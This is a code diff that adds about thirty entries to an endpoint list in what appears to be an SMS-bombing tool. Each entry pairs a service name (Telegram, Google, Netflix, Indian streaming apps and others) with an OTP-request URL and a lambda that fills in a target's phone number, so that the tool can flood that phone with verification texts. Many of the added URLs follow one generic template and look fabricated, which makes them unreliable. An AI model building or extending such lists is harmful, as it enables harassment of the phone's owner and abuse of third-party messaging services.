@@ -98,6 +98,202 @@ APIS = [       {"name": "Tata Capital Voice Call", "url": "https://mobapp.tataca
     {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}'},
     {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}'},
     {"name": "AstroSage", "url": lambda phone: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}", "method": "GET", "headers": {}, "data": None},
+        {
+            "name": "Telegram SMS",
+            "url": "https://my.telegram.org/auth/send_password",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda phone: f"phone={phone}"
+        },
+        {
+            "name": "Signal SMS",
+            "url": "https://signal.org/api/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "Discord SMS",
+            "url": "https://discord.com/api/v9/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "Snapchat SMS",
+            "url": "https://accounts.snapchat.com/accounts/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda phone: f"phone_number={phone}"
+        },
+        {
+            "name": "Instagram SMS",
+            "url": "https://www.instagram.com/api/v1/accounts/send_otp/",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda phone: f"phone_number={phone}"
+        },
+        {
+            "name": "Facebook SMS",
+            "url": "https://www.facebook.com/api/graphql/",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda phone: f"phone={phone}&otp_type=sms"
+        },
+        {
+            "name": "Twitter SMS",
+            "url": "https://api.twitter.com/1.1/account/send_otp.json",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda phone: f"phone_number={phone}"
+        },
+        {
+            "name": "LinkedIn SMS",
+            "url": "https://www.linkedin.com/uas/v2/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "Microsoft SMS",
+            "url": "https://login.microsoftonline.com/common/oauth2/v2.0/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda phone: f"phone={phone}"
+        },
+        {
+            "name": "Google SMS",
+            "url": "https://accounts.google.com/_/signup/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda phone: f"phoneNumber={phone}"
+        },
+        {
+            "name": "Apple SMS",
+            "url": "https://idmsa.apple.com/appleauth/auth/sign-in/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'
+        },
+        {
+            "name": "Netflix SMS",
+            "url": "https://www.netflix.com/api/shakti/v1/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "Amazon Prime SMS",
+            "url": "https://www.amazon.in/ap/signin",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda phone: f"phone={phone}&action=prime_otp"
+        },
+        {
+            "name": "Hotstar SMS",
+            "url": "https://api.hotstar.com/o/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "SonyLIV SMS",
+            "url": "https://www.sonyliv.com/api/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"mobile":"{phone}"}}'
+        },
+        {
+            "name": "Zee5 SMS",
+            "url": "https://www.zee5.com/api/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "Voot SMS",
+            "url": "https://www.voot.com/api/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "MX Player SMS",
+            "url": "https://www.mxplayer.in/api/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "JioTV SMS",
+            "url": "https://www.jiotv.com/api/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "Airtel Xstream SMS",
+            "url": "https://www.airtelxstream.in/api/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "VI Movies SMS",
+            "url": "https://www.vimovies.com/api/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "BMS SMS",
+            "url": "https://in.bookmyshow.com/api/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "Paytm Movies SMS",
+            "url": "https://paytmmovies.com/api/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "Amazon MiniTV SMS",
+            "url": "https://www.amazon.in/ap/signin",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda phone: f"phone={phone}&action=minitv_otp"
+        },
+        {
+            "name": "Chingari SMS",
+            "url": "https://www.chingari.io/api/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "Moj SMS",
+            "url": "https://www.mojapp.in/api/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "Josh SMS",
+            "url": "https://www.joshapp.in/api/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
+        {
+            "name": "Mitron SMS",
+            "url": "https://www.mitron.tv/api/v1/auth/send-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone: f'{{"phone":"{phone}"}}'
+        },
 ]
 
 HTML_PAGE = """
